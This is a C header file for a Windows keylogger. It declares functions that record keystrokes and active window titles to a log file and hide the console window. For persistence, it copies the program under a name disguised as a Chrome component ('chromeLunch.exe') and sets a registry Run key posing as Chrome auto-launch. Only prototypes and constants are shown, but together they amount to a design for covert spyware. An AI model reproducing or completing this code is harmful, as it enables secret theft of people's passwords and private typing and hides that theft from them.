#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <direct.h>
#include <string.h>

/* Defines */
#define LOGFILE "log.txt"
#define OLDFILE "KeyLogger.exe"
#define NEWFILE "chromeLunch.exe"
#define REGISTERY_NAME "ChromeAutoLaunch_9A8B7C6D12E4F9A27B3A7F5C4D9A6B8F2"
#define KEY_PRESSED 0x8000
#define CAPSLOCK_MASK 0x0001
#define KEY_CODE_MIN 8
#define KEY_CODE_MAX 256
#define SLEEP_INTERVAL_MS 10
#define WINDOW_TITLE_BUFFER_SIZE 256
#define TITLE_LOG_BUFFER_SIZE 300

/* function prototypes */
/**
 * Logs the input string to the log file.
 *
 * @param input The string to be logged.
 */
void logKey(const char *input);

/**
 * Handles special keys and modifier keys.
 *
 * @param key The key code.
 * @return 1 if the key is handled as a special key (or a modifier) and no further logging is needed, 0 otherwise.
 */
int handleSpecialKeys(int key);

/**
 * Maps a key code to its shifted equivalent.
 *
 * @param key The key code.
 * @return The corresponding shifted character.
 */
char mapWithShift(int key);

/**
 * Handles key press events by logging the appropriate character.
 *
 * @param key The key code.
 */
void handleKeyPress(int key);

/**
 * Handles key release events by updating modifier flags.
 *
 * @param key The key code.
 */
void handleKeyRelease(int key);

/**
 * Creates a directory at the specified target path if it does not already exist.
 *
 * @param targetPath The directory path.
 */
void create_directory(char *targetPath);

/**
 * Copies the executable file to a system location for persistence.
 *
 * @param targetPath The buffer to store the target path.
 */
void copyToSystemLocation(char *targetPath);

/**
 * Sets the registry key for persistence to automatically run the copied executable.
 *
 * @param targetPath The path of the copied executable.
 */
void setRegistryPersistence(const char *targetPath);

/**
 * Performs the persistence operations: copying the file and setting registry.
 */
void persistence();

/**
 * Updates the log file with the current active window title.
 *
 * @note Uses a static variable to remember the last active window title.
 */
 void updateWindowTitle();

/**
 * Hides the console window.
 */
void hideConsole();

#endif // KEYLOGGER_H
